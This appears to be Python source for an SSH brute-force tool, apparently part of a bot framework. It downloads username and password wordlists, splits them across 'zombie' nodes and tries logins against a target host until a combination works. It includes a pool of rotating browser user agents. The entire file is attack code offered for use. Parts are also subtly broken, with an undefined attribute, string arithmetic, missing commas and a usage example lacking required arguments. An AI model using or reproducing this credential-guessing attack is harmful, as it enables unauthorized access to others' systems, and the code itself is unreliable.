#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n


import random, socket, time, os
from datetime import datetime

from app.modules import http_client, ssh_client, files_mgmt
from app.components import config

class Bruteforcer:
    def __init__(self, attack_type, target, wordlists, to_stop_at=datetime.strftime(datetime.now(), '%Y-%m-%d %H:%M:%S'),
                 port=80, n_sockets=150, slice_wl="1/1", sleeptime=15):
        self.attack_type = attack_type
        self.target = target
        self.wordlists = wordlists
        self.slice_wl = slice_wl
        self.to_stop_at = to_stop_at
        self.port = port
        self.n_sockets = n_sockets
        self.sleeptime = sleeptime
        self.first_word_position = ""
        self.last_word_position = ""

        #self.list_of_threads = []
        self.user_agents = (
            # CHROME
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPod; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
            #FIREFOX
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (X11; Linux i686; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/31.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 11_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/31.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (iPod touch; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/31.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/85.0",
            "Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:85.0) Gecko/85.0 Firefox/85.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
            # SAFARI
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPod touch; CPU iPhone 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
            # EDGE
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.63",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.56",
            "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36 EdgA/45.12.4.5125",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36 EdgA/45.12.4.5125",
            "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36 EdgA/45.12.4.5125",
            "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36 EdgA/45.12.4.5125",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 EdgiOS/45.12.4 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Mobile Safari/537.36 Edge/40.15254.603",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edge/44.19041.4788"
        )

        self.report = 'Initializing report. Number of sockets used: {}\r\nHTTPS enabled: {}\r\nSleep time: {}\r\nAttack started at {}...\r\nRequest sent:\r\n'.format(self.n_sockets, self.https, self.sleeptime, datetime.now().strftime("%Y-%m-%d, %H:%M:%S"))

    def download_and_save_wordlists(self):
        for wordlist_url in self.wordlists:
            if self.wordlists[wordlist_url]:
                path_to_file = os.path.join(config.TEMP_DIR, wordlist_url)
                if http_client.download_file(self.wordlists[wordlist_url], path_to_file):
                    self.wordlists[wordlist_url] = path_to_file
            else:
                self.wordlists[wordlist_url] = None

    def get_first_and_last_word_positions(self):
        for wordlist_path in self.wordlists:
            if self.wordlists[wordlist_path]:
                total_lines = files_mgmt.count_file_lines(self.wordlists[wordlist_path])
                p, t = self.slice_wl.split("/")
                lines_per_zombie = int(total_lines) / int(t)
                self.first_word_position = (lines_per_zombie * (p-1)) - 1
                self.last_word_position = (lines_per_zombie * (p))



    def run(self):
        hostname = self.target
        socket_count = self.n_sockets
        self.report += "\r\nAttacking {} with {} sockets.".format(hostname, socket_count)

        # read all wordlists provided from url
        self.download_and_save_wordlists()
        self.get_first_and_last_word_positions()

        with open(self.wordlists["usernames"], 'r') as usernames_wl:
            u_count = 0
            while True:
                u_count += 1
                # Get next line from file
                u_line = usernames_wl.readline()
                # if line is empty end of file is reached
                if not u_line:
                    self.report += "combo u:p not found"
                    break

                username = u_line.strip('\n').strip('\r').strip()
                with open(self.wordlists["passwords"], 'r') as passwords_wl:
                    p_count = 0
                    while True:
                        p_count += 1
                        # Get next line from file
                        p_line = passwords_wl.readline()
                        # if line is empty end of file is reached
                        if not p_line:
                            break

                        password = p_line.strip('\n').strip('\r').strip()
                        try:
                            self.report += "\r\nTrying combination -> {}:{}".format(username, password)

                            if self.attack_type == 'ssh':
                                succesful_login = ssh_client.ssh_login(hostname, username, password)
                                if succesful_login:
                                    self.report += '\r\ncombo u:p found -> {}:{}'.format(username, password)
                                    break

                            # break attack by stop time
                            stop_time = datetime.strptime(self.to_stop_at, '%Y-%m-%d %H:%M:%S')
                            if datetime.now() >= stop_time:
                                break

                            # self.report += "\r\nSleeping for %d seconds".format(self.sleeptime)
                            # time.sleep(self.sleeptime)

                        except (KeyboardInterrupt, SystemExit):
                            self.report += "\r\nStopping attack"
                            break


if __name__ == "__main__":
    # usage example
    attack = Bruteforcer('ssh', '127.0.0.1', port=23, to_stop_at='2021-07-02 20:58:00', n_sockets=1000)
    attack.run()
